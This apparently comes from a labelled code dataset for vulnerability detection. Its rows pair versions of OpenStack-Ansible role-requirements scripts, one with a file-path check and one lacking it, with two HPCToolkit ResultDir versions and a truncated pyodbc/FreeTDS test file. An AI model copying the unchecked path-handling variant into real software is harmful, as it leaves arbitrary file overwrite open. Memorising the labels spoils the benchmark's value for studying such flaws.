        help='<Required> ansible-role-requirements.yml file location',
        required=True
    )

    parser.add_argument(
        '-n',
        '--name',
        help='<Optional> The name of the Ansible role to edit',
        required=False
    )

    parser.add_argument(
        '-v',
        '--version',
        help='<Required> The version to set for the Ansible role',
        required=True
    )

    parser.add_argument(
        '-s',
        '--src',
        help='<Optional> The source URL to identify the, or set for the Ansible role',
        required=False
    )

    # Parse arguments
    args = parser.parse_args()

    cwd = os.getcwd()
    f = os.path.realpath(args.file)
    if os.path.commonprefix((f, cwd)) != cwd:
        print ""bad file: %s"" % f
        sys.exit(1)

    # Read the ansible-role-requirements.yml file into memory
    with open(f, ""r"") as role_req_file:
        reqs = yaml.safe_load(role_req_file)

    # Loop through the list to find the applicable role
    for role_data in reqs:
        if args.name:
            if role_data['name'] == args.name:
                # Change the specified role data
                role_data['version'] = args.version
                if args.src:
                    role_data['src'] = args.src
        elif args.src:
           if role_data['src'] == args.src:
                # Change the specified role data
                role_data['version'] = args.version

    # Write out the resulting file
    with open(f, ""w"") as role_req_file:
        try:
            yaml.dump(reqs, role_req_file, default_flow_style=False)
        except yaml.YAMLError as exc:
            print(exc)

if __name__ == ""__main__"":
    main()
/n/n/nscripts/get_role_version.py/n/n#!/usr/bin/env python2.7
#
# Copyright 2016, Rackspace US, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# (c) 2016, Jesse Pretorius <jesse.pretorius@rackspace.co.uk>
#


""""""Read current version from ansible-role-requirements.yml content from the CLI.""""""


#from __future__ import print_function

import argparse
import os
import sys
import yaml


def main():
    """"""Run the main application.""""""

    # Setup argument parsing
    parser = argparse.ArgumentParser(
        description='ansible-role-requirements.yml CLI reader',
        epilog='Licensed ""Apache 2.0""')

    parser.add_argument(
        '-f',
        '--file',
        help='<Required> ansible-role-requirements.yml file location',
        required=True
    )

    parser.add_argument(
        '-n',
        '--name',
        help='<Optional> The name of the Ansible role to edit',
        required=False
    )

    parser.add_argument(
        '-s',
        '--src',
        help='<Optional> The source URL to identify the, or set for the Ansible role',
        required=False
    )

    # Parse arguments
    args = parser.parse_args()

    cwd = os.getcwd()
    f = os.path.realpath(args.file)
    if os.path.commonprefix((f, cwd)) != cwd:
        print ""bad file: %s"" % f
        sys.exit(1)

    # Read the ansible-role-requirements.yml file into memory
    with open(f, ""r"") as role_req_file:
        reqs = yaml.safe_load(role_req_file)

    # Loop through the list to find the applicable role
    for role_data in reqs:
        if args.name:
            if role_data['name'] == args.name:
                print role_data['version']
        elif args.src:
           if role_data['src'] == args.src:
                print role_data['version']


if __name__ == ""__main__"":
    main()
/n/n/n",0
111,061f01edaa5a69c4777bdf59916f73a484dd8130,"/scripts/ansible-role-requirements-editor.py/n/n#!/usr/bin/env python2.7
#
# Copyright 2016, Rackspace US, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# (c) 2016, Jesse Pretorius <jesse.pretorius@rackspace.co.uk>
#


""""""Read/write ansible-role-requirements.yml content from the CLI.""""""


from __future__ import print_function

import argparse
import yaml


# To ensure that the dicts are always output in the same order
# we setup a representation for dict objects and register it
# with the yaml class.
def represent_dict(self, data):
    def key_function((key, value)):
        # Prioritizes certain keys when sorting.
        prio = {""model"": 0, ""pk"": 1, ""fields"": 2}.get(key, 99)
        return (prio, key)
    items = data.items()
    items.sort(key=key_function)
    return self.represent_mapping(u'tag:yaml.org,2002:map', items)

yaml.add_representer(dict, represent_dict)


def main():
    """"""Run the main application.""""""

    # Setup argument parsing
    parser = argparse.ArgumentParser(
        description='ansible-role-requirements.yml CLI editor',
        epilog='Licensed ""Apache 2.0""')

    parser.add_argument(
        '-f',
        '--file',
        help='<Required> ansible-role-requirements.yml file location',
        required=True
    )

    parser.add_argument(
        '-n',
        '--name',
        help='<Optional> The name of the Ansible role to edit',
        required=False
    )

    parser.add_argument(
        '-v',
        '--version',
        help='<Required> The version to set for the Ansible role',
        required=True
    )

    parser.add_argument(
        '-s',
        '--src',
        help='<Optional> The source URL to identify the, or set for the Ansible role',
        required=False
    )

    # Parse arguments
    args = parser.parse_args()

    # Read the ansible-role-requirements.yml file into memory
    with open(args.file, ""r"") as role_req_file:
        reqs = yaml.safe_load(role_req_file)

    # Loop through the list to find the applicable role
    for role_data in reqs:
        if args.name:
            if role_data['name'] == args.name:
                # Change the specified role data
                role_data['version'] = args.version
                if args.src:
                    role_data['src'] = args.src
        elif args.src:
           if role_data['src'] == args.src:
                # Change the specified role data
                role_data['version'] = args.version

    # Write out the resulting file
    with open(args.file, ""w"") as role_req_file:
        try:
            yaml.dump(reqs, role_req_file, default_flow_style=False)
        except yaml.YAMLError as exc:
            print(exc)

if __name__ == ""__main__"":
    main()
/n/n/n/scripts/get_role_version.py/n/n#!/usr/bin/env python2.7
#
# Copyright 2016, Rackspace US, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# (c) 2016, Jesse Pretorius <jesse.pretorius@rackspace.co.uk>
#


""""""Read current version from ansible-role-requirements.yml content from the CLI.""""""


#from __future__ import print_function

import argparse
import yaml


def main():
    """"""Run the main application.""""""

    # Setup argument parsing
    parser = argparse.ArgumentParser(
        description='ansible-role-requirements.yml CLI reader',
        epilog='Licensed ""Apache 2.0""')

    parser.add_argument(
        '-f',
        '--file',
        help='<Required> ansible-role-requirements.yml file location',
        required=True
    )

    parser.add_argument(
        '-n',
        '--name',
        help='<Optional> The name of the Ansible role to edit',
        required=False
    )

    parser.add_argument(
        '-s',
        '--src',
        help='<Optional> The source URL to identify the, or set for the Ansible role',
        required=False
    )

    # Parse arguments
    args = parser.parse_args()

    # Read the ansible-role-requirements.yml file into memory
    with open(args.file, ""r"") as role_req_file:
        reqs = yaml.safe_load(role_req_file)

    # Loop through the list to find the applicable role
    for role_data in reqs:
        if args.name:
            if role_data['name'] == args.name:
                print role_data['version']
        elif args.src:
           if role_data['src'] == args.src:
                print role_data['version']


if __name__ == ""__main__"":
    main()
/n/n/n",1
112,6ad16eb9bc401f848c16cb621f5bdd83080cc285,"runner/src/resultdir.py/n/n################################################################################
#                                                                              #
#  output.py                                                                   #
#  preserve files and metrics output by running a job                          #
#                                                                              #                                                                              #
#  $HeadURL$                                                                   #
#  $Id$                                                                        #
#                                                                              #
#  --------------------------------------------------------------------------- #
#  Part of HPCToolkit (hpctoolkit.org)                                         #
#                                                                              #
#  Information about sources of support for research and development of        #
#  HPCToolkit is at 'hpctoolkit.org' and in 'README.Acknowledgments'.          #
#  --------------------------------------------------------------------------- #
#                                                                              #
#  Copyright ((c)) 2002-2017, Rice University                                  #
#  All rights reserved.                                                        #
#                                                                              #
#  Redistribution and use in source and binary forms, with or without          #
#  modification, are permitted provided that the following conditions are      #
#  met:                                                                        #
#                                                                              #
#  * Redistributions of source code must retain the above copyright            #
#    notice, this list of conditions and the following disclaimer.             #
#                                                                              #
#  * Redistributions in binary form must reproduce the above copyright         #
#    notice, this list of conditions and the following disclaimer in the       #
#    documentation and/or other materials provided with the distribution.      #
#                                                                              #
#  * Neither the name of Rice University (RICE) nor the names of its           #
#    contributors may be used to endorse or promote products derived from      #
#    this software without specific prior written permission.                  #
#                                                                              #
#  This software is provided by RICE and contributors ""as is"" and any          #
#  express or implied warranties, including, but not limited to, the           #
#  implied warranties of merchantability and fitness for a particular          #
#  purpose are disclaimed. In no event shall RICE or contributors be           #
#  liable for any direct, indirect, incidental, special, exemplary, or         #
#  consequential damages (including, but not limited to, procurement of        #
#  substitute goods or services; loss of use, data, or profits; or             #
#  business interruption) however caused and on any theory of liability,       #
#  whether in contract, strict liability, or tort (including negligence        #
#  or otherwise) arising in any way out of the use of this software, even      #
#  if advised of the possibility of such damage.                               #
#                                                                              #
################################################################################


from common import options, debugmsg



class ResultDir():
    
    def __init__(self, parentdir, name):

        from collections import OrderedDict
        from os import makedirs
        from os.path import join

        self.name = name
        self.dir = join(parentdir, ""_"" + self.name)
        makedirs(self.dir)
        self.outdict = OrderedDict()
        self.numOutfiles = 0


    def __contains__(self, key):
        
        return key in self.outdict
        
    
    def getDir(self):

        return self.dir
        
    
    def makePath(self, nameFmt, label=None):

        from os.path import join

        self.numOutfiles += 1
        path = join(self.dir, (""{:02d}-"" + nameFmt).format(self.numOutfiles, label))
        return path


    def add(self, *keysOrValues, **kwargs):
        
        from collections import OrderedDict
        from common import assertmsg, fatalmsg
        
        assertmsg(len(keysOrValues) >= 2, ""Output.add must receive at least 2 arguments"")
        
        # decompose arguments
        keyPath = kwargs.get(""subroot"", []) + list(keysOrValues[:-2])   # last 2 elements of 'keysOrValues' are key & value for final store
        lastKey = keysOrValues[-2]  # used to store 'value', but also included in 'keyPath'
        value   = keysOrValues[-1]

        # perform insertion
        ob = self._findValueForPath(lastKey, *keyPath)
        fmt = kwargs.get(""format"", None)
        ob[lastKey] = value if fmt is None else float(fmt.format(value))


    def get(self, *keyPath):
        
        # assert: can traverse keyPath without needed to add a new collection, so None is ok for keyAfter
        print keyPath
        return self._findValueForPath(None, *keyPath)


    def addSummaryStatus(self, status, msg):
        
        self.add(""summary"", ""status"",     status)
        self.add(""summary"", ""status msg"", msg)
        

    def write(self):

        from os.path import join
        from spackle import writeYamlFile

        writeYamlFile(join(self.dir, ""{}.yaml"".format(self.name)), self.outdict)


    def _isCompatible(self, key, collection):
        
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype, ctype = type(key), type(collection)
        
        if ktype is str:
            return ctype is dict or ctype is OrderedDict
        elif ktype is int:
            return ctype is list
        else:
            fatalmsg(""ResultDir._isCompatible: invalid key type ({})"".format(ktype))
    
    
    def _findValueForPath(self, keyAfter, *keyPath):
    
        ob = self.outdict
        for k, key in enumerate(keyPath):
            if self._isCompatible(key, ob):
                if key not in ob:
                    nextkey = keyPath[k+1] if k+1 < len(keyPath) else keyAfter
                    ob[key] = self._collectionForKey(nextkey)
                ob = ob[key]
            else:
                fatalmsg(""ResultDir: invalid key for current collection in key path"")
        return ob
    
    
    def _collectionForKey(self, key):
    
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype = type(key)
        
        if ktype is str:
            return OrderedDict()
        elif ktype is int:
            return list()
        else:
            fatalmsg(""ResultDir._collectionForKey: invalid key type ({})"".format(ktype))




/n/n/n",0
113,6ad16eb9bc401f848c16cb621f5bdd83080cc285,"/runner/src/resultdir.py/n/n################################################################################
#                                                                              #
#  output.py                                                                   #
#  preserve files and metrics output by running a job                          #
#                                                                              #                                                                              #
#  $HeadURL$                                                                   #
#  $Id$                                                                        #
#                                                                              #
#  --------------------------------------------------------------------------- #
#  Part of HPCToolkit (hpctoolkit.org)                                         #
#                                                                              #
#  Information about sources of support for research and development of        #
#  HPCToolkit is at 'hpctoolkit.org' and in 'README.Acknowledgments'.          #
#  --------------------------------------------------------------------------- #
#                                                                              #
#  Copyright ((c)) 2002-2017, Rice University                                  #
#  All rights reserved.                                                        #
#                                                                              #
#  Redistribution and use in source and binary forms, with or without          #
#  modification, are permitted provided that the following conditions are      #
#  met:                                                                        #
#                                                                              #
#  * Redistributions of source code must retain the above copyright            #
#    notice, this list of conditions and the following disclaimer.             #
#                                                                              #
#  * Redistributions in binary form must reproduce the above copyright         #
#    notice, this list of conditions and the following disclaimer in the       #
#    documentation and/or other materials provided with the distribution.      #
#                                                                              #
#  * Neither the name of Rice University (RICE) nor the names of its           #
#    contributors may be used to endorse or promote products derived from      #
#    this software without specific prior written permission.                  #
#                                                                              #
#  This software is provided by RICE and contributors ""as is"" and any          #
#  express or implied warranties, including, but not limited to, the           #
#  implied warranties of merchantability and fitness for a particular          #
#  purpose are disclaimed. In no event shall RICE or contributors be           #
#  liable for any direct, indirect, incidental, special, exemplary, or         #
#  consequential damages (including, but not limited to, procurement of        #
#  substitute goods or services; loss of use, data, or profits; or             #
#  business interruption) however caused and on any theory of liability,       #
#  whether in contract, strict liability, or tort (including negligence        #
#  or otherwise) arising in any way out of the use of this software, even      #
#  if advised of the possibility of such damage.                               #
#                                                                              #
################################################################################


from common import options, debugmsg



class ResultDir():
    
    def __init__(self, parentdir, name):

        from collections import OrderedDict
        from os import makedirs
        from os.path import join

        self.name = name
        self.dir = join(parentdir, ""_"" + self.name)
        makedirs(self.dir)
        self.outdict = OrderedDict()
        self.numOutfiles = 0


    def __contains__(self, key):
        
        return key in self.outdict
        
    
    def getDir(self):

        return self.dir
        
    
    def makePath(self, nameFmt, label=None):

        from os.path import join

        self.numOutfiles += 1
        path = join(self.dir, (""{:02d}-"" + nameFmt).format(self.numOutfiles, label))
        return path


    def add(self, *keysOrValues, **kwargs):
        
        from collections import OrderedDict
        from common import assertmsg, fatalmsg
        
        assertmsg(len(keysOrValues) >= 2, ""Output.add must receive at least 2 arguments"")
        
        # decompose arguments
        keyPath = kwargs.get(""subroot"", []) + list(keysOrValues[:-1])   # last element of 'keysOrValues' is the value
        lastKey = keysOrValues[-2]  # used to store 'value', but also included in 'keyPath'
        value   = keysOrValues[-1]

        # perform insertion
        ob = self._findValueForPath(*keyPath)
        fmt = kwargs.get(""format"", None)
        ob[lastKey] = value if fmt is None else float(fmt.format(value))


    def get(self, *keyPath):
        
        return self._findValueForPath(keyPath)


    def addSummaryStatus(self, status, msg):
        
        self.add(""summary"", ""status"",     status)
        self.add(""summary"", ""status msg"", msg)
        

    def write(self):

        from os.path import join
        from spackle import writeYamlFile

        writeYamlFile(join(self.dir, ""{}.yaml"".format(self.name)), self.outdict)


    def _isCompatible(self, key, collection):
        
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype, ctype = type(key), type(collection)
        
        if ktype is str:
            return ctype is dict or ctype is OrderedDict
        elif ktype is int:
            return ctype is list
        else:
            fatalmsg(""ResultDir._isCompatible: invalid key type ({})"".format(ktype))
    
    
    def _findValueForPath(self, *keyPath):
    
        ob = self.outdict
        for k, key in enumerate(keyPath[:-1]):    # last key in 'keyPath' is not traversed, but used to store given 'value'
            if self._isCompatible(key, ob):
                if key not in ob:
                    nextkey = keyPath[k+1]
                    ob[key] = self._collectionForKey(nextkey)
                ob = ob[key]
            else:
                fatalmsg(""ResultDir: invalid key for current collection in key path"")
        return ob
    
    
    def _collectionForKey(self, key):
    
        from collections import OrderedDict
        from common import fatalmsg
    
        ktype = type(key)
        
        if ktype is str:
            return OrderedDict()
        elif ktype is int:
            return list()
        else:
            fatalmsg(""ResultDir._collectionForKey: invalid key type ({})"".format(ktype))




/n/n/n",1
114,dcdb81e6f86420c96cc113a726be8663566cfe95,"tests2/freetdstests.py/n/n#!/usr/bin/python
# -*- coding: latin-1 -*-

usage = """"""\
usage: %prog [options] connection_string

Unit tests for FreeTDS / SQL Server.  To use, pass a connection string as the parameter.
The tests will create and drop tables t1 and t2 as necessary.

These run using the version from the 'build' directory, not the version
installed into the Python directories.  You must run python setup.py build
before running the tests.

You can also put the connection string into a tmp/setup.cfg file like so:

  [freetdstests]
  connection-string=DSN=xyz;UID=test;PWD=test
""""""

import sys, os, re
import unittest
from decimal import Decimal
from datetime import datetime, date, time
from os.path import join, getsize, dirname, abspath
from testutils import *

_TESTSTR = '0123456789-abcdefghijklmnopqrstuvwxyz-'

def _generate_test_string(length):
    """"""
    Returns a string of `length` characters, constructed by repeating _TESTSTR as necessary.

    To enhance performance, there are 3 ways data is read, based on the length of the value, so most data types are
    tested with 3 lengths.  This function helps us generate the test data.

    We use a recognizable data set instead of a single character to make it less likely that ""overlap"" errors will
    be hidden and to help us manually identify where a break occurs.
    """"""
    if length <= len(_TESTSTR):
        return _TESTSTR[:length]

    c = (length + len(_TESTSTR)-1) / len(_TESTSTR)
    v = _TESTSTR * c
    return v[:length]

class FreeTDSTestCase(unittest.TestCase):

    SMALL_FENCEPOST_SIZES = [ 0, 1, 255, 256, 510, 511, 512, 1023, 1024, 2047, 2048, 4000 ]
    LARGE_FENCEPOST_SIZES = [ 4095, 4096, 4097, 10 * 1024, 20 * 1024 ]

    ANSI_FENCEPOSTS    = [ _generate_test_string(size) for size in SMALL_FENCEPOST_SIZES ]
    UNICODE_FENCEPOSTS = [ unicode(s) for s in ANSI_FENCEPOSTS ]
    IMAGE_FENCEPOSTS   = ANSI_FENCEPOSTS + [ _generate_test_string(size) for size in LARGE_FENCEPOST_SIZES ]

    def __init__(self, method_name, connection_string):
        unittest.TestCase.__init__(self, method_name)
        self.connection_string = connection_string

    def get_sqlserver_version(self):
        """"""
        Returns the major version: 8-->2000, 9-->2005, 10-->2008
        """"""
        self.cursor.execute(""exec master..xp_msver 'ProductVersion'"")
        row = self.cursor.fetchone()
        return int(row.Character_Value.split('.', 1)[0])

    def setUp(self):
        self.cnxn   = pyodbc.connect(self.connection_string)
        self.cursor = self.cnxn.cursor()

        for i in range(3):
            try:
                self.cursor.execute(""drop table t%d"" % i)
                self.cnxn.commit()
            except:
                pass

        for i in range(3):
            try:
                self.cursor.execute(""drop procedure proc%d"" % i)
                self.cnxn.commit()
            except:
                pass

        try:
            self.cursor.execute('drop function func1')
            self.cnxn.commit()
        except:
            pass

        self.cnxn.rollback()

    def tearDown(self):
        try:
            self.cursor.close()
            self.cnxn.close()
        except:
            # If we've already closed the cursor or connection, exceptions are thrown.
            pass

    def test_binary_type(self):
        if sys.hexversion >= 0x02060000:
            self.assertIs(pyodbc.BINARY, bytearray)
        else:
            self.assertIs(pyodbc.BINARY, buffer)

    def test_multiple_bindings(self):
        ""More than one bind and select on a cursor""
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t1 values (?)"", 2)
        self.cursor.execute(""insert into t1 values (?)"", 3)
        for i in range(3):
            self.cursor.execute(""select n from t1 where n < ?"", 10)
            self.cursor.execute(""select n from t1 where n < 3"")
        

    def test_different_bindings(self):
        self.cursor.execute(""create table t1(n int)"")
        self.cursor.execute(""create table t2(d datetime)"")
        self.cursor.execute(""insert into t1 values (?)"", 1)
        self.cursor.execute(""insert into t2 values (?)"", datetime.now())

    def test_drivers(self):
        p = pyodbc.drivers()
        self.assertTrue(isinstance(p, list))

    def test_datasources(self):
        p = pyodbc.dataSources()
        self.assertTrue(isinstance(p, dict))

    def test_getinfo_string(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CATALOG_NAME_SEPARATOR)
        self.assertTrue(isinstance(value, str))

    def test_getinfo_bool(self):
        value = self.cnxn.getinfo(pyodbc.SQL_ACCESSIBLE_TABLES)
        self.assertTrue(isinstance(value, bool))

    def test_getinfo_int(self):
        value = self.cnxn.getinfo(pyodbc.SQL_DEFAULT_TXN_ISOLATION)
        self.assertTrue(isinstance(value, (int, long)))

    def test_getinfo_smallint(self):
        value = self.cnxn.getinfo(pyodbc.SQL_CONCAT_NULL_BEHAVIOR)
        self.assertTrue(isinstance(value, int))

    def test_noscan(self):
        self.assertEqual(self.cursor.noscan, False)
        self.cursor.noscan = True
        self.assertEqual(self.cursor.noscan, True)

    def test_guid(self):
        self.cursor.execute(""create table t1(g1 uniqueidentifier)"")
        self.cursor.execute(""insert into t1 values (newid())"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(len(v), 36)

    def test_nextset(self):
        self.cursor.execute(""create table t1(i int)"")
        for i in range(4):
            self.cursor.execute(""insert into t1(i) values(?)"", i)

        self.cursor.execute(""select i from t1 where i < 2 order by i; select i from t1 where i >= 2 order by i"")
        
        for i, row in enumerate(self.cursor):
            self.assertEqual(i, row.i)

        self.assertEqual(self.cursor.nextset(), True)

        for i, row in enumerate(self.cursor):
            self.assertEqual(i + 2, row.i)

    def test_fixed_unicode(self):
        value = u""t\xebsting""
        self.cursor.execute(""create table t1(s nchar(7))"")
        self.cursor.execute(""insert into t1 values(?)"", u""t\xebsting"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), unicode)
        self.assertEqual(len(v), len(value)) # If we alloc'd wrong, the test below might work because of an embedded NULL
        self.assertEqual(v, value)


    def _test_strtype(self, sqltype, value, resulttype=None, colsize=None):
        """"""
        The implementation for string, Unicode, and binary tests.
        """"""
        assert colsize is None or isinstance(colsize, int), colsize
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        if resulttype is None:
            resulttype = type(value)

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), resulttype)

        if value is not None:
            self.assertEqual(len(v), len(value))

        # To allow buffer --> db --> bytearray tests, always convert the input to the expected result type before
        # comparing.
        if type(value) is not resulttype:
            value = resulttype(value)

        self.assertEqual(v, value)


    def _test_strliketype(self, sqltype, value, resulttype=None, colsize=None):
        """"""
        The implementation for text, image, ntext, and binary.

        These types do not support comparison operators.
        """"""
        assert colsize is None or isinstance(colsize, int), colsize
        assert colsize is None or (value is None or colsize >= len(value))

        if colsize:
            sql = ""create table t1(s %s(%s))"" % (sqltype, colsize)
        else:
            sql = ""create table t1(s %s)"" % sqltype

        if resulttype is None:
            resulttype = type(value)

        self.cursor.execute(sql)
        self.cursor.execute(""insert into t1 values(?)"", value)
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), resulttype)

        if value is not None:
            self.assertEqual(len(v), len(value))

        # To allow buffer --> db --> bytearray tests, always convert the input to the expected result type before
        # comparing.
        if type(value) is not resulttype:
            value = resulttype(value)

        self.assertEqual(v, value)


    #
    # varchar
    #

    def test_varchar_null(self):
        self._test_strtype('varchar', None, colsize=100)

    # Generate a test for each fencepost size: test_varchar_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('varchar', value, colsize=len(value))
        return t
    for value in ANSI_FENCEPOSTS:
        locals()['test_varchar_%s' % len(value)] = _maketest(value)

    def test_varchar_many(self):
        self.cursor.execute(""create table t1(c1 varchar(300), c2 varchar(300), c3 varchar(300))"")

        v1 = 'ABCDEFGHIJ' * 30
        v2 = '0123456789' * 30
        v3 = '9876543210' * 30

        self.cursor.execute(""insert into t1(c1, c2, c3) values (?,?,?)"", v1, v2, v3);
        row = self.cursor.execute(""select c1, c2, c3, len(c1) as l1, len(c2) as l2, len(c3) as l3 from t1"").fetchone()

        self.assertEqual(v1, row.c1)
        self.assertEqual(v2, row.c2)
        self.assertEqual(v3, row.c3)

    def test_varchar_upperlatin(self):
        self._test_strtype('varchar', '�')

    #
    # unicode
    #

    def test_unicode_null(self):
        self._test_strtype('nvarchar', None, colsize=100)

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strtype('nvarchar', value, colsize=len(value))
        return t
    for value in UNICODE_FENCEPOSTS:
        locals()['test_unicode_%s' % len(value)] = _maketest(value)

    def test_unicode_upperlatin(self):
        self._test_strtype('nvarchar', u'�')

    def test_unicode_longmax(self):
        # Issue 188:	Segfault when fetching NVARCHAR(MAX) data over 511 bytes

        ver = self.get_sqlserver_version()
        if ver < 9:            # 2005+
            return              # so pass / ignore
        self.cursor.execute(""select cast(replicate(N'x', 512) as nvarchar(max))"")

    def test_unicode_bind(self):
        value = u'test'
        v = self.cursor.execute(""select ?"", value).fetchone()[0]
        self.assertEqual(value, v)
        
    #
    # binary
    #

    def test_binary_null(self):
        # FreeTDS does not support SQLDescribeParam, so we must specifically tell it when we are inserting
        # a NULL into a binary column.
        self.cursor.execute(""create table t1(n varbinary(10))"")
        self.cursor.execute(""insert into t1 values (?)"", pyodbc.BinaryNull);

    # buffer

    def _maketest(value):
        def t(self):
            self._test_strtype('varbinary', buffer(value), resulttype=pyodbc.BINARY, colsize=len(value))
        return t
    for value in ANSI_FENCEPOSTS:
        locals()['test_binary_buffer_%s' % len(value)] = _maketest(value)

    # bytearray

    if sys.hexversion >= 0x02060000:
        def _maketest(value):
            def t(self):
                self._test_strtype('varbinary', bytearray(value), colsize=len(value))
            return t
        for value in ANSI_FENCEPOSTS:
            locals()['test_binary_bytearray_%s' % len(value)] = _maketest(value)

    #
    # image
    #

    def test_image_null(self):
        self._test_strliketype('image', None, type(None))

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strliketype('image', buffer(value), pyodbc.BINARY)
        return t
    for value in IMAGE_FENCEPOSTS:
        locals()['test_image_buffer_%s' % len(value)] = _maketest(value)

    if sys.hexversion >= 0x02060000:
        # Python 2.6+ supports bytearray, which pyodbc considers varbinary.
        
        # Generate a test for each fencepost size: test_unicode_0, etc.
        def _maketest(value):
            def t(self):
                self._test_strtype('image', bytearray(value))
            return t
        for value in IMAGE_FENCEPOSTS:
            locals()['test_image_bytearray_%s' % len(value)] = _maketest(value)

    def test_image_upperlatin(self):
        self._test_strliketype('image', buffer('�'), pyodbc.BINARY)

    #
    # text
    #

    # def test_empty_text(self):
    #     self._test_strliketype('text', bytearray(''))

    def test_null_text(self):
        self._test_strliketype('text', None, type(None))

    # Generate a test for each fencepost size: test_unicode_0, etc.
    def _maketest(value):
        def t(self):
            self._test_strliketype('text', value)
        return t
    for value in ANSI_FENCEPOSTS:
        locals()['test_text_buffer_%s' % len(value)] = _maketest(value)

    def test_text_upperlatin(self):
        self._test_strliketype('text', '�')

    #
    # bit
    #

    def test_bit(self):
        value = True
        self.cursor.execute(""create table t1(b bit)"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        v = self.cursor.execute(""select b from t1"").fetchone()[0]
        self.assertEqual(type(v), bool)
        self.assertEqual(v, value)

    #
    # decimal
    #

    def _decimal(self, precision, scale, negative):
        # From test provided by planders (thanks!) in Issue 91

        self.cursor.execute(""create table t1(d decimal(%s, %s))"" % (precision, scale))

        # Construct a decimal that uses the maximum precision and scale.
        decStr = '9' * (precision - scale)
        if scale:
            decStr = decStr + ""."" + '9' * scale
        if negative:
            decStr = ""-"" + decStr
        value = Decimal(decStr)

        self.cursor.execute(""insert into t1 values(?)"", value)

        v = self.cursor.execute(""select d from t1"").fetchone()[0]
        self.assertEqual(v, value)

    def _maketest(p, s, n):
        def t(self):
            self._decimal(p, s, n)
        return t
    for (p, s, n) in [ (1,  0,  False),
                       (1,  0,  True),
                       (6,  0,  False),
                       (6,  2,  False),
                       (6,  4,  True),
                       (6,  6,  True),
                       (38, 0,  False),
                       (38, 10, False),
                       (38, 38, False),
                       (38, 0,  True),
                       (38, 10, True),
                       (38, 38, True) ]:
        locals()['test_decimal_%s_%s_%s' % (p, s, n and 'n' or 'p')] = _maketest(p, s, n)


    def test_decimal_e(self):
        """"""Ensure exponential notation decimals are properly handled""""""
        value = Decimal((0, (1, 2, 3), 5)) # prints as 1.23E+7
        self.cursor.execute(""create table t1(d decimal(10, 2))"")
        self.cursor.execute(""insert into t1 values (?)"", value)
        result = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(result, value)

    def test_subquery_params(self):
        """"""Ensure parameter markers work in a subquery""""""
        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        row = self.cursor.execute(""""""
                                  select x.id
                                  from (
                                    select id
                                    from t1
                                    where s = ?
                                      and id between ? and ?
                                   ) x
                                   """""", 'test', 1, 10).fetchone()
        self.assertNotEqual(row, None)
        self.assertEqual(row[0], 1)

    def _exec(self):
        self.cursor.execute(self.sql)
        
    def test_close_cnxn(self):
        """"""Make sure using a Cursor after closing its connection doesn't crash.""""""

        self.cursor.execute(""create table t1(id integer, s varchar(20))"")
        self.cursor.execute(""insert into t1 values (?,?)"", 1, 'test')
        self.cursor.execute(""select * from t1"")

        self.cnxn.close()
        
        # Now that the connection is closed, we expect an exception.  (If the code attempts to use
        # the HSTMT, we'll get an access violation instead.)
        self.sql = ""select * from t1""
        self.assertRaises(pyodbc.ProgrammingError, self._exec)

    def test_empty_string(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", """")

    def test_fixed_str(self):
        value = ""testing""
        self.cursor.execute(""create table t1(s char(7))"")
        self.cursor.execute(""insert into t1 values(?)"", ""testing"")
        v = self.cursor.execute(""select * from t1"").fetchone()[0]
        self.assertEqual(type(v), str)
        self.assertEqual(len(v), len(value)) # If we alloc'd wrong, the test below might work because of an embedded NULL
        self.assertEqual(v, value)

    def test_empty_unicode(self):
        self.cursor.execute(""create table t1(s nvarchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", u"""")

    def test_unicode_query(self):
        self.cursor.execute(u""select 1"")
        
    def test_negative_row_index(self):
        self.cursor.execute(""create table t1(s varchar(20))"")
        self.cursor.execute(""insert into t1 values(?)"", ""1"")
        row = self.cursor.execute(""select * from t1"").fetchone()
        self.assertEqual(row[0], ""1"")
        self.assertEqual(row[-1], ""1"")

